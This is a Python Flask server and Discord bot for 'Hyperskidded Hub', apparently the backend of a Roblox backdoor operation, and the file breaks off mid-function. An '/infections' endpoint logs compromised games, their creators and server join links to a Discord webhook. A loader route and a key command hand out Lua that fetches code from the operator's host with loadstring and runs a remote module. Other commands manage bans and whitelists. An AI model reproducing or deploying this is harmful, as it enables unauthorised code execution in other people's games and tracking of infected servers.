import discord
import flask
import os
import colorama
import requests
import threading
import asyncio
import logging
import time
import random
import string

from discord.ext import commands
from colorama import Fore
from flask import Flask, jsonify, request
from time import sleep

app = Flask(__name__)
token = os.getenv("TOKEN")
url = os.getenv("URL")
logs = os.getenv("LOGS_URL")
infections = os.getenv("INFECTIONS_URL")
auth_key = os.getenv("AUTH")
owner = 1224392642448724012

whitelisted_users = {
	"1224392642448724012": 1224392642448724012,
	"1289008907955470439": 1289008907955470439,
}

generated_keys = {}
infection_whitelist = {}
banned_users = {}
usage_banned_users = {}

auth_headers = {
	"Authorization": token
}

def checkIfUserExists(username: str):
	url = "https://users.roblox.com/v1/usernames/users"
	headers = {
		"Content-Type": "application/json"
	}
	data = {
		"usernames": [username],
		"excludeBannedUsers": False
	}

	try:
		response = requests.post(url, json=data, headers=headers)
		if response.status_code == 200:
			result = response.json()
			if result['data'][0]:
				return {
					"exists": True
				}
			else:
				return {"exists": False}
		else:
			return {
				"exists": False,
				"error": f"{response.status_code}"
			}
	except requests.exceptions.RequestException as e:
		return {"exists": False, "error": str(e)}
	
def getUserInfo(username: str):
	url = "https://users.roblox.com/v1/usernames/users"
	headers = {
		"Content-Type": "application/json"
	}
	data = {
		"usernames": [username],
		"excludeBannedUsers": False
	}

	try:
		response = requests.post(url, json=data, headers=headers)
		if response.status_code == 200:
			result = response.json()
			if result['data'][0]:
				return {
					"displayName": result['data'][0].get("displayName"),
					"isVerified": result['data'][0].get("hasVerifiedBadge"),
					"userId": result["data"][0].get("id")
				}
			else:
				return {"exists": False}
		else:
			return {
				"error": f"{response.status_code}"
			}
	except requests.exceptions.RequestException as e:
		return {"error": str(e)}
	
def getGameInfo(universeId: int):
	url = "https://games.roblox.com/v1/games"
	headers = {
		"Content-Type": "application/json"
	}
	data = {
		"universeIds": [universeId]
	}

	try:
		response = request.get(url=url, headers=headers, json=data)
		if response.status_code == 200:
			result = response.json()
			data = result['data'][0]
			return {
				"name": data.get("name"),
				"genre": data.get("genre"),
				"visits": data.get("visits"),
				"playing": data.get("playing"),
				"created": data.get("created"),
				"updated": data.get("updated"),
				"genre_l1": data.get("genre_l1"),
				"genre_l2": data.get("genre_l2"),
				"sourceName": data.get("sourceName"),
				"maxPlayers": data.get("maxPlayers"),
				"favoritedCount": data.get("favoritedCount")
			}
		else:
			return {
				"error": f"{response.status_code}"
			}
	except Exception as err:
		return {
				"error": str(err)
			}

def getBans():
	novaBans = requests.get("http://api.scriptlang.com/bans")
	karmaBans = requests.get("http://karma.scriptlang.com/bans")
	Bans112 = requests.get("http://api.ocbwoy3.dev/banland.json")
	sleepcoreBans = requests.get("https://skidgod.vercel.app/SleepCore/bans.json")
	aparamBans = requests.get("https://zv7i.dev/static/aparambans.json")   

	return {
		"Nova": novaBans.json(),
		"Karma": karmaBans.json(),
		"oneonetwo": Bans112.json(),
		"Sleepcore": sleepcoreBans.json(),
		"aparam": aparamBans.json()
	}

@app.route("/")
def index():
	return "https://discord.gg/jQ3vCYCJZD"

@app.route("/hyperskidded-hub")
def getscript():
	return "return function(config) local source = require(118343058201260); source:HyperskiddedHub(config) end"

@app.route("/infections", methods=["POST"])
def infection():
	data = request.get_json()

	# important stuff
	gameid = data.get("game-id", "?") ##
	authorization = data.get("authorization", "?") #

	# server fingerprint
	jobid = data.get("job-id", "?") #
	playercount = data.get("player-count", "?") ##
	placeid = str(data.get("place-id", "?"))

	# game fingerprint
	gamedata = getGameInfo(universeId=gameid)

	name = gamedata.get("name", "?") #
	genre = gamedata.get("genre", "?") #
	visits = str(gamedata.get("visits", "?")) ##
	playing = str(gamedata.get("playing", "?")) ##
	created = gamedata.get("created", "?") #
	updated = gamedata.get("updated", "?") #
	genrel1 = gamedata.get("genre_l1", "?") #
	genrel2 = gamedata.get("genre_l2", "?") # 
	sourcename = gamedata.get("sourceName", "?") #
	maxplayers = str(gamedata.get("maxPlayers", "?")) ##
	favoritedcount = str(gamedata.get("favoritedCount", "?")) ##

	# creator fingerprint
	creatoruserid = str(data.get("creator-userid", "?")) ##
	creatorusername = data.get("creator-username", "?") #
	isVerified = str(getUserInfo(username=creatorusername).get("isVerified", "?"))
	displayName = getUserInfo(username=creatorusername).get("displayName", "?")

	if authorization != auth_key:
		return jsonify({"status": "forbidden"}), 404
	
	try:
		requests.post(infections, json={
			"content": None,
			"embeds": [
				{
					"title": "Hyperskidded Hub",
					"description": f"A running Job ID has been logged.\n> Join the server using [this](https://www.roblox.com/games/start?placeId={placeid}&serverInstanceId={jobid}) link.",
					"color": 4653192,
					"fields": [
						{
							"name": "> Game Fingerprint",
							"value": f"> `gameId:` {str(gameid)}\n> `name:` {name}\n> `sourceName:` {sourcename}\n> `playing:` {playing}\n> `visits:` {visits}\n> `maxPlayers:` {maxplayers}\n> `created:` {created}\n> `updated:` {updated}\n> `genre:` {genre}\n> `genre_l1:` {genrel1}\n> `genre_l2:` {genrel2}\n> `favoritedCount:` {favoritedcount}",
							"inline": True
						},
						{
							"name": "> Creator Fingerprint",
							"value": f"> `username:` {creatorusername}\n> `userId`: {creatoruserid}\n> `displayName:` {displayName}\n> `isVerified:` {isVerified}",
							"inline": True
						},
						{
							"name": "> Server Fingerprint",
							"value": f"> `jobId:` {jobid}\n> `totalPlayers:` {playercount}\n> `placeId:` {placeid}"
						}
					],
					"footer": {
						"text": "Hyperskidded Hub | Infections",
						"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
					}
				}
			],
		})
		return jsonify({"status": "success"}), 200
	except Exception as err:
		return jsonify({"error": str(err)}), 500
	
@app.route("/keys", methods=["GET"])
def keys():
	return jsonify(generated_keys), 200

@app.route("/loader")
def loader():
	return """return function(gPlayer, key, gMode)
	local httpService 		= game:GetService("HttpService")
	local homeUrl 			= "https://hyperskidded-bot.onrender.com/"

	local keys				= httpService:JSONDecode(httpService:GetAsync(homeUrl.."keys"))

	if keys[gPlayer] then
		local id	 = 118343058201260
		local source = require(id)
	
		source:HyperskiddedHub({player = gPlayer, mode = gMode})
	end
end"""

@app.route("/ban", methods=["POST"])
def ban():
	data = request.get_json()
	user = data.get("user")
	sender = data.get("sender")
	reason = data.get("reason")
	authorization = data.get("authorization")

	if authorization != token:
		requests.post(logs, json={
			"content": None,
			"embeds": [
				{
					"title": "Hyperskidded Hub",
					"description": f"An unexpected ban request has been logged.",
					"color": 7340207,
					"fields": [
						{
							"name": "Sender",
							"value": sender
						},
						{
							"name": "User provided to ban",
							"value": user
						},
						{
							"name": "Reason",
							"value": f"```\n{reason}\n```"
						}
					],
					"footer": {
						"text": "Hyperskidded Hub",
						"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
					}
				}
			],
		})
		return jsonify({"status": "forbidden", "error": "You do not have a valid authorization key."}), 404
	
	if not whitelisted_users[str(sender)]:
		return jsonify({"status": "forbidden", "error": "You're not authorized."}), 404
	
	try:
		exists = checkIfUserExists(username=user)
		if exists.get("exists") == True:
			banned_users[user] = {"reason": reason}
			requests.post(logs, json={
				"content": None,
				"embeds": [
					{
						"title": "Hyperskidded Hub",
						"description": f"A new ban has been issued by <@{sender}>",
						"color": 7340207,
						"fields": [
							{
								"name": "User",
								"value": user
							},
							{
								"name": "Reason",
								"value": f"```\n{reason}\n```"
							}
						],
						"footer": {
							"text": "Hyperskidded Hub",
							"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
						}
					}
				],
			})
			return jsonify({"status": "success"}), 200
		else:
			return jsonify({"status": "non-existent"}), 500
	except Exception as err:
		return jsonify({"status": "error", "message": str(err)}), 500
	
@app.route("/unban", methods=["POST"])
def unban():
	data = request.get_json()
	user = data.get("user")
	sender = data.get("sender")
	authorization = data.get("authorization")

	if authorization != token:
		requests.post(logs, json={
			"content": None,
			"embeds": [
				{
					"title": "Hyperskidded Hub",
					"description": f"An unexpected unban request has been logged.",
					"color": 7340207,
					"fields": [
						{
							"name": "Sender",
							"value": sender
						},
						{
							"name": "User provided to ban",
							"value": user
						},
					],
					"footer": {
						"text": "Hyperskidded Hub",
						"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
					}
				}
			],
		})
		return jsonify({"status": "forbidden", "error": "You do not have a valid authorization key."}), 404
	
	if not whitelisted_users[str(sender)]:
		return jsonify({"status": "forbidden", "error": "You're not authorized."}), 404
	
	try:
		if banned_users[user]:
			del banned_users[user]
			requests.post(logs, json={
				"content": None,
				"embeds": [
					{
						"title": "Hyperskidded Hub",
						"description": f"An user has been unbanned by <@{sender}>",
						"color": 7340207,
						"fields": [
							{
								"name": "User",
								"value": user
							},
						],
						"footer": {
							"text": "Hyperskidded Hub",
							"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
						}
					}
				],
			})
			return jsonify({"status": "success"}), 200
		else:
			return jsonify({"status": "not banned"}), 400
	except Exception as err:
		return jsonify({"status": "error", "message": str(err)}), 500
	
@app.route("/usage-unban", methods=["POST"])
def usageunban():
	data = request.get_json()
	user = data.get("user")
	sender = data.get("sender")
	authorization = data.get("authorization")

	if authorization != token:
		requests.post(logs, json={
			"content": None,
			"embeds": [
				{
					"title": "Hyperskidded Hub",
					"description": f"An unexpected usage unban request has been logged.",
					"color": 7340207,
					"fields": [
						{
							"name": "Sender",
							"value": sender
						},
						{
							"name": "User provided to unban",
							"value": user
						},
					],
					"footer": {
						"text": "Hyperskidded Hub",
						"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
					}
				}
			],
		})
		return jsonify({"status": "forbidden", "error": "You do not have a valid authorization key."}), 404
	
	if not whitelisted_users[str(sender)]:
		return jsonify({"status": "forbidden", "error": "You're not authorized."}), 404
	
	try:
		if usage_banned_users[user]:
			del usage_banned_users[user]
			requests.post(logs, json={
				"content": None,
				"embeds": [
					{
						"title": "Hyperskidded Hub",
						"description": f"An user has been usage unbanned by <@{sender}>",
						"color": 7340207,
						"fields": [
							{
								"name": "User",
								"value": user
							},
						],
						"footer": {
							"text": "Hyperskidded Hub",
							"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
						}
					}
				],
			})
		
			return jsonify({"status": "success"}), 200
		else:
			return jsonify({"status": "not banned"}), 400
	except Exception as err:
		return jsonify({"status": "error", "message": str(err)}), 500
	
	
@app.route("/usage-ban", methods=["POST"])
def usage_ban():
	data = request.get_json()
	user = data.get("user")
	sender = str(data.get("sender"))
	reason = str(data.get("reason"))
	authorization = data.get("authorization")

	if authorization != token:
		requests.post(logs, json={
			"content": None,
			"embeds": [
				{
					"title": "Hyperskidded Hub",
					"description": f"An unexpected usage ban request has been logged.",
					"color": 7340207,
					"fields": [
						{
							"name": "Sender",
							"value": sender
						},
						{
							"name": "User provided to ban",
							"value": user
						},
						{
							"name": "Reason",
							"value": f"```\n{reason}\n```"
						}
					],
					"footer": {
						"text": "Hyperskidded Hub",
						"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
					}
				}
			],
		})
		return jsonify({"status": "forbidden", "error": "You do not have a valid authorization key."}), 404
	
	if not whitelisted_users[str(sender)]:
		return jsonify({"status": "forbidden", "error": "You're not authorized."}), 404
	
	try:
		if checkIfUserExists(username=user).get("exists") == True:
			usage_banned_users[user] = {"reason": reason}
			requests.post(logs, json={
				"content": None,
				"embeds": [
					{
						"title": "Hyperskidded Hub",
						"description": f"A new usage ban has been issued by <@{sender}>",
						"color": 7340207,
						"fields": [
							{
								"name": "User",
								"value": user
							},
							{
								"name": "Reason",
								"value": f"```\n{reason}\n```"
							}
						],
						"footer": {
							"text": "Hyperskidded Hub",
							"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
						}
					}
				],
			})
			return jsonify({"status": "success"}), 200
		else:
			return jsonify({"status": "non-existent"}), 500
	except Exception as err:
		return jsonify({"status": "error", "message": str(err)}), 500

@app.route("/bans", methods=["GET"])
def bans():
	try:
		return jsonify(banned_users), 200
	except Exception as err:
		return jsonify({"status": "error", "message": str(err)}), 500

@app.route("/usage-bans", methods=["GET"])
def usagebans():
	try:
		return jsonify(usage_banned_users), 200
	except Exception as err:
		return jsonify({"status": "error", "message": str(err)}), 500
	
@app.route("/infection-whitelists", methods=["GET"])
def infectionwhitelists():
	try:
		return jsonify(infection_whitelist), 200
	except Exception as err:
		return jsonify({"status": "error", "message": str(err)}), 500

@app.route("/whitelist", methods=["POST"])
def whitelist():
	data = request.get_json()
	user = data.get("user_id")
	sender = data.get("sender")
	authorization = data.get("authorization")

	if authorization != token:
		requests.post(logs, json={
			"content": None,
			"embeds": [
				{
					"title": "Hyperskidded Hub",
					"description": f"An unexpected whitelist request has been logged.",
					"color": 7340207,
					"fields": [
						{
							"name": "Sender",
							"value": sender
						},
						{
							"name": "User attempted to be whitelisted",
							"value": user
						},
					],
					"footer": {
						"text": "Hyperskidded Hub",
						"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
					}
				}
			],
		})
		return jsonify({"status": "forbidden", "error": "You do not have a valid authorization key."}), 404
	
	if sender != owner:
		return jsonify({"status": "forbidden", "error": "You're not authorized."}), 404
	
	try:
		whitelisted_users[str(user)] = user
		return jsonify({"status": "success"}), 200
	except Exception as err:
		return jsonify({"status": "error", "message": str(err)}), 500
	
@app.route("/remove-whitelist", methods=["POST"])
def removewhitelist():
	data = request.get_json()
	user = data.get("user_id")
	sender = data.get("sender")
	authorization = data.get("authorization")

	if authorization != token:
		requests.post(logs, json={
			"content": None,
			"embeds": [
				{
					"title": "Hyperskidded Hub",
					"description": f"An unexpected whitelist removal request has been logged.",
					"color": 7340207,
					"fields": [
						{
							"name": "Sender",
							"value": sender
						},
						{
							"name": "User provided to remove whitelist",
							"value": user
						},
					],
					"footer": {
						"text": "Hyperskidded Hub",
						"icon_url": "https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512"
					}
				}
			],
		})
		return jsonify({"status": "forbidden", "error": "You do not have a valid authorization key."}), 404
	
	if sender != owner:
		return jsonify({"status": "forbidden", "error": "You're not authorized."}), 404
	
	try:
		if whitelisted_users[str(user)]:
			del whitelisted_users[str(user)]
			return jsonify({"status": "success"}), 200
		else:
			return jsonify({"status": "not whitelisted"}), 400
	except Exception as err:
		return jsonify({"status": "error", "message": str(err)}), 500

bot = commands.Bot(command_prefix = ">", intents = discord.Intents.all())

@bot.event
async def on_ready():
	print("[Hyperskidded Hub]: Bot is ready.")
	await bot.change_presence(status = discord.Status.dnd, activity = discord.Activity(type=discord.ActivityType.watching, name="the chinese communist party"))

@bot.event
async def on_connect():
	print("[Hyperskidded Hub]: Bot has connected to Discord.")

@bot.event
async def on_command_error(ctx, error):
	try:
		await ctx.message.delete()
	except Exception as err:
		embed = discord.Embed(
			color = discord.Color.red(),
			title = "Error",
			description = "An unexpected error has occured."
		)
		embed.add_field(name="Details", value=err, inline=False)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)

	if isinstance(error, commands.CommandNotFound):
		embed = discord.Embed(
			color = discord.Color.yellow(),
			title = "Warning",
			description = "This command isn't valid."
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512") 
		await ctx.send(embed=embed)
		print(f"[{Fore.GREEN}Hyperskidded Hub{Fore.RESET}]: Invalid command ran: {ctx.message.content}")

	if isinstance(error, commands.CheckFailure):
		embed = discord.Embed(
			color = discord.Color.yellow(),
			title = "Warning",
			description = "You do not have the necessary permissions to use this command."
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512") 
		await ctx.send(embed=embed)

	if isinstance(error, commands.BadArgument):
		embed = discord.Embed(
			color = discord.Color.yellow(),
			title = "Warning",
			description = "Invalid arguments were provided to the command."
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512") 
		await ctx.send(embed=embed)

	if isinstance(error, commands.MissingRequiredArgument):
		embed = discord.Embed(
			color = discord.Color.yellow(),
			title = "Warning",
			description = "Missing arguments were provided to the command."
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512") 
		await ctx.send(embed=embed)

@bot.event
async def on_command(ctx):
	try:
		await ctx.message.delete()
	except:
		pass

@bot.command()
async def ban(ctx, user: str, *, reason: str):
	try:
		sentrequest = requests.post(url+"ban", json={"user": user, "authorization": token, "sender": ctx.author.id, "reason": reason})
		if sentrequest.status_code == 404:
			embed = discord.Embed(
				color = discord.Color.yellow(),
				title = "Warning",
				description = "You are not whitelisted."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 500:
			embed = discord.Embed(
				color = discord.Color.red(),
				title = "Error",
				description = "An unexpected error has occured."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 200:
			embed = discord.Embed(
				color = discord.Color.green(),
				title = "Success",
				description = f"""Banned {user}
```
{reason}
```
				"""
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
	except Exception as err:
		embed = discord.Embed(
			color = discord.Color.red(),
			title = "Error",
			description = str(err)
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)

@bot.command()
async def unban(ctx, user: str):
	try:
		sentrequest = requests.post(url+"unban", json={"user": user, "authorization": token, "sender": ctx.author.id})
		if sentrequest.status_code == 404:
			embed = discord.Embed(
				color = discord.Color.yellow(),
				title = "Warning",
				description = "You are not whitelisted."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 500:
			embed = discord.Embed(
				color = discord.Color.red(),
				title = "Error",
				description = "An unexpected error has occured."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 200:
			embed = discord.Embed(
				color = discord.Color.green(),
				title = "Success",
				description = "Unbanned user: "+user
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
	except Exception as err:
		embed = discord.Embed(
			color = discord.Color.red(),
			title = "Error",
			description = str(err)
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)

@bot.command()
async def infectionwl(ctx, user: str):
	try:
		infection_whitelist[user] = user
		embed = discord.Embed(
			color = discord.Color.green(),
			title = "Success",
			description = "Added "+user+" to the infector whitelist."
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)
	except Exception as err:
		embed = discord.Embed(
			color = discord.Color.red(),
			title = "Error",
			description = str(err)
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)

@bot.command()
async def usageban(ctx, user: str, *, reason: str):
	try:
		sentrequest = requests.post(url+"usage-ban", json={"user": user, "authorization": token, "sender": ctx.author.id, "reason": reason})
		if sentrequest.status_code == 404:
			embed = discord.Embed(
				color = discord.Color.yellow(),
				title = "Warning",
				description = "You are not whitelisted."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 500:
			embed = discord.Embed(
				color = discord.Color.red(),
				title = "Error",
				description = "An unexpected error has occured."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 200:
			embed = discord.Embed(
				color = discord.Color.green(),
				title = "Success",
				description = f"""Banned {user} from using Hyperskidded Hub.
```
{reason}
```
				"""
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
	except Exception as err:
		embed = discord.Embed(
			color = discord.Color.red(),
			title = "Error",
			description = str(err)
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)

@bot.command()
async def usageunban(ctx, user: str):
	try:
		sentrequest = requests.post(url+"usage-unban", json={"user": user, "authorization": token, "sender": ctx.author.id})
		if sentrequest.status_code == 404:
			embed = discord.Embed(
				color = discord.Color.yellow(),
				title = "Warning",
				description = "You are not whitelisted."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 500:
			embed = discord.Embed(
				color = discord.Color.red(),
				title = "Error",
				description = "An unexpected error has occured."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 200:
			embed = discord.Embed(
				color = discord.Color.green(),
				title = "Success",
				description = "Unbanned "+user+""
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
	except Exception as err:
		embed = discord.Embed(
			color = discord.Color.red(),
			title = "Error",
			description = str(err)
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)

@bot.command()
async def whitelist(ctx, user: discord.User):
	try:
		sentrequest = requests.post(url+"whitelist", json={"user": user.id, "authorization": token, "sender": ctx.author.id})
		if sentrequest.status_code == 404:
			embed = discord.Embed(
				color = discord.Color.yellow(),
				title = "Warning",
				description = "You are not the owner."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 500:
			embed = discord.Embed(
				color = discord.Color.red(),
				title = "Error",
				description = "An unexpected error has occured."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 200:
			embed = discord.Embed(
				color = discord.Color.green(),
				title = "Success",
				description = "Whitelisted "+user
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 400:
			embed = discord.Embed(
				color = discord.Color.yellow(),
				title = "Warning",
				description = "User is already whitelisted."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
	except Exception as err:
		embed = discord.Embed(
			color = discord.Color.red(),
			title = "Error",
			description = str(err)
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)

@bot.command()
async def key(ctx, user: str):
	gKey = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
	generated_keys[user] = gKey
	await ctx.send(f"""```lua
local httpService = game:GetService("HttpService")
local loader = loadstring(httpService:GetAsync("https://hyperskidded-bot.onrender.com/loader"))()

loader(owner.Name or "{user}", "{gKey}", "standard") -- or "serverside"
```""")

@bot.command()
async def removewhitelist(ctx, user: discord.User):
	try:
		sentrequest = requests.post(url+"remove-whitelist", json={"user": user.id, "authorization": token, "sender": ctx.author.id})
		if sentrequest.status_code == 404:
			embed = discord.Embed(
				color = discord.Color.yellow(),
				title = "Warning",
				description = "You are not the owner."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 500:
			embed = discord.Embed(
				color = discord.Color.red(),
				title = "Error",
				description = "An unexpected error has occured."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 200:
			embed = discord.Embed(
				color = discord.Color.green(),
				title = "Success",
				description = "Unwhitelisted "+user
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
		elif sentrequest.status_code == 400:
			embed = discord.Embed(
				color = discord.Color.yellow(),
				title = "Warning",
				description = "Specified user is not whitelisted."
			)
			embed.timestamp = discord.utils.utcnow()
			embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
			await ctx.send(embed=embed)
	except Exception as err:
		embed = discord.Embed(
			color = discord.Color.red(),
			title = "Error",
			description = str(err)
		)
		embed.timestamp = discord.utils.utcnow()
		embed.set_footer(text="Hyperskidded Hub", icon_url="https://cdn.discordapp.com/icons/1320734306053918782/9cf4f4109ed0594691e765fef657a957.webp?size=512")
		await ctx.send(embed=embed)
		
@bot.command()
async def lookup(ctx, user: str):
	try:
		ban_data = getBans()
		userInfo = getUserInfo(username=user)
		
		nova = "Not banned"
		karma = "Not banned"
		aparam = "Not banned"
		oneonetwo = "Not banned"
		sleepcore = "Not banned"

		userId = str(userInfo.get("userId"))

		try:
			nova = ban_data.get("Nova").get(f"{userId}").get("reason")
		except Exception as err:
			nova = "User is not banned."
		
		try:
			karma = ban_data.get("Karma").get(f"{userId}").get("reason")
		except Exception as err:
			karma = "User is not banned."
		
		try:
			aparam = ban_data.get("aparam").get(f"{userId}").get("reason")
		except Exception as err:
			aparam = "User is not banned."
		
		try:
			oneonetwo = ban_data.get("oneonetwo").get(f"{userId}").get("reason")
		except Exception as err:
			oneonetwo = "User is not banned."
		
		try:
			sleepcore = ban_data.get("Sleepcore").get(f"{userId}").get("reason")
		except Exception as err:
			sleepcore = "User is not banned."
		
		embed = discord.Embed(
			color = discord.Color.green(),
			title = "User Lookup - " + user
		)

